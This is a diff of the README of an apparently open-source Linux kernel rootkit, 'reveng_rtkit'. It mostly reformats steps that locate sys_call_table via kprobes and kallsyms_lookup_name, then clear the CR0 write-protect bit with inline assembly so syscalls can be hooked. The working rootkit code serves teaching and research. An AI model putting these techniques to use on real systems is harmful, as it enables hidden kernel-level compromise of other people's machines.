@@ -699,20 +699,20 @@ We gonna need this two functions, one to set the function name, in this case, `k
 
 Lets make our code to retrieve the address of the sys_call_table....
 
-1. Adding necessary libraries.
+a) Adding necessary libraries.
 ```c
 #include <linux/init.h>		/* Needed for the macros */
 #include <linux/module.h>	/* Needed by all modules */
 #include <linux/kernel.h>	/* Needed for printing log level messages */
 #include <linux/kprobes.h>
 ```
-2. Setting which _dynamic kernel symbol_ to find by utilizing the kprobe structure that I discussed earlier.
+b) Setting which _dynamic kernel symbol_ to find by utilizing the kprobe structure that I discussed earlier.
 ```c
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
 };
 ```
-3. The main operation will take place in the entry function.\
+c) The main operation will take place in the entry function.\
 For storing address of sys_call_table
 ```c
 unsigned long *syscall_table;
@@ -741,7 +741,7 @@ As we have got the address of `kallsyms_lookup_name` symbol, now we can use this
 ```c
 syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 ```
-4. So the full code:
+d) So the full code:
 ```c
 #include <linux/init.h>		/* Needed for the macros */
 #include <linux/module.h>	/* Needed by all modules */
@@ -832,51 +832,48 @@ Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :win
 
 Before modifying the `syscall table`, we first need to disable the WP(write protection) flag in the control register (or cr0 reg) in order to make syscall table editable/writable, from read-only mode.
 
-   According to [sysprog21.github.io/lkmpg/#system-calls](https://sysprog21.github.io/lkmpg/#system-calls):\
-      _Control register (or cr0 reg) is a processor register that changes or controls the general behavior of the CPU. For x86 architecture, the cr0 register has various control flags that modify the basic operation of the processor. The WP flag in cr0 stands for write protection. Once the WP flag is set, the processor disallows further write attempts to the read-only sections._
+According to [sysprog21.github.io/lkmpg/#system-calls](https://sysprog21.github.io/lkmpg/#system-calls):\
+_Control register (or cr0 reg) is a processor register that changes or controls the general behavior of the CPU. For x86 architecture, the cr0 register has various control flags that modify the basic operation of the processor. The WP flag in cr0 stands for write protection. Once the WP flag is set, the processor disallows further write attempts to the read-only sections._
 
-   Therefore, we must disable the WP flag before modifying sys_call_table. => ***`WP flag must be set to 0`***.
+Therefore, we must disable the WP flag before modifying sys_call_table. => ***`WP flag must be set to 0`***.
 
-   1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/72a939257c42562222b2b4c0785c46997cb4e1d1/kernel_src/reveng_rtkit.c#L308).\
+a) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/72a939257c42562222b2b4c0785c46997cb4e1d1/kernel_src/reveng_rtkit.c#L308).\
       Reading the status/state of cr0 register.
-
 ```c
-          cr0 = read_cr0();
+cr0 = read_cr0();
 ```
 #### NOTE:
 ```
-          read_cr0(): Reading the status/state of cr0 register.
-          write_cr0(): Writing to the cr0 register.
+read_cr0(): Reading the status/state of cr0 register.
+write_cr0(): Writing to the cr0 register.
 ```
+b) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L310).
 
-   2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L310).
-
-      Setting WP flag in cr0 register to `zero`. But how to do it?
-         
-         According to [change-value-of-wp-bit-in-cr0](https://hadfiabdelmoumene.medium.com/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411):
-         As we are already in ring-0 ,i.e. in kernel mode, we already can write directly to cr0 registry and we don’t need to call write_cr0() function.
-         We will be using ***this function*** to **write in cr0 register** instead of standard `write_cr0() function`.
+Setting WP flag in cr0 register to `zero`. But how to do it?\
+According to [change-value-of-wp-bit-in-cr0](https://hadfiabdelmoumene.medium.com/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411):\
+As we are already in ring-0 ,i.e. in kernel mode, we already can write directly to cr0 registry and we don’t need to call write_cr0() function.\
+We will be using ***this function*** to **write in cr0 register** instead of standard `write_cr0() function`.
     
-         Here, `__force_order` is used to force instruction serialization.
+Here, `__force_order` is used to force instruction serialization.
 ```c
-          static inline void write_cr0_forced(unsigned long val)
-          {
-            unsigned long __force_order;
+static inline void write_cr0_forced(unsigned long val)
+{
+	unsigned long __force_order;
 
-            asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
-          }
+	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
+}
 ```
-   3. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L323)
+c) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L323)
 
-      Now, we will be using this function, `write_cr0_forced` to set WP flag to zero in cr0 register.
+Now, we will be using this function, `write_cr0_forced` to set WP flag to zero in cr0 register.
 ```c
-          static inline void unprotect_memory(void)
-          {
-            pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
-            write_cr0_forced(cr0 & ~0x00010000);    // Setting WP flag to 0 => writable
-          }
+static inline void unprotect_memory(void)
+{
+	pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
+	write_cr0_forced(cr0 & ~0x00010000);    // Setting WP flag to 0 => writable
+}
 ```
-   #### Step3: <ins>Performing the actual hooking</ins>.
+#### Step3: <ins>Performing the actual hooking</ins>.
 
    According to this [blog](https://xcellerator.github.io/posts/linux_rootkits_02/#how-the-kernel-handles-syscalls):\
       The arguments that we pass from usermode are stored in registers (if you have done some RE, you should have known that, right?), then this values are stored in a special struct called [pt_regs](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12), which is then passed to the syscall, then syscall performs its work and go through the members of the passed stucture in which it is interested in. 
